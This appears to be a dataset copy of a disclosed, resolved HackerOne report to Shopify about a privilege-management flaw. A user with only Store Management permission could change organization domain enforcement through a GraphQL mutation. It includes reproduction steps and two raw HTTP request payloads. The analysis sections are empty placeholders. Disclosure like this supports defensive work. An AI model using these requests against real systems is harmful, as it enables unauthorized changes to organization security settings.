@@ -1,0 +1,109 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '1084892'
+original_report_id: '1084892'
+title: '[h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState
+  - that should be limited to User Management Only'
+weakness: Improper Privilege Management
+team_handle: shopify
+created_at: '2021-01-22T22:10:18.150Z'
+disclosed_at: '2022-04-21T22:05:27.786Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 20
+asset_identifier: Plus Web Admin with Single Domain Feature
+asset_type: OTHER
+max_severity: critical
+tags:
+- hackerone
+- improper-privilege-management
+---
+
+# [h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only
+
+## Metadata
+
+- HackerOne Report ID: 1084892
+- Weakness: Improper Privilege Management
+- Program: shopify
+- Disclosed At: 2022-04-21T22:05:27.786Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+## Summary:
+User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only
+
+## Description:
+User with `Store management` permission - {F1168470} only, is able to change user management settings using the graphql
+
+## Steps To Reproduce:
+- 
+- 
+- 
+- 
+
+- As an org plus admin, visit https://shopify.plus/:org_plus_id/users/invite and invite an user to have `store management permission` - (The purpose is to enable the low-privileged user to have access to https://shopify.plus/:plus_org_id/stores/api
+- As an org plus admin, create a Org domain, by visiting `https://shopify.plus/:id/users/security` and `Add Domain`
+- Login as the low-priviledged user, and visit shopify.plus and click around until you made a valid graphql call to shopify.plus, it looks something like this `POST /34946971/stores/api HTTP/1.1`
+- Make this call to figure out the domain id of your organization as a low privileged user 
+
+```
+POST /34946971/stores/api HTTP/1.1
+Host: shopify.plus
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+...
+
+{"query":"query{organization{domains{id}}}"}
+```
+
+- Grab the id and replace the REPLACE_ME in the below GraphQL call
+
+```
+POST /34946971/stores/api HTTP/1.1
+Host: shopify.plus
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+...
+
+{"query":"mutation  {\n  changeDomainEnforcementState(domainIds: [\"REPLACE_ME\"],enforcementState:NOT_ENFORCED) {\n    organization {\n      id\n      domains {\n        id\n        domainName\n        status\n        verified\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
+```
+
+- Then it shows you are able to `changeDomainEnforcementState` by just having Store Management permission
+
+
+
+## Supporting Material/References:
+
+## Impact
+
+User with Store Management permission can enforce/unenforce domain state
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
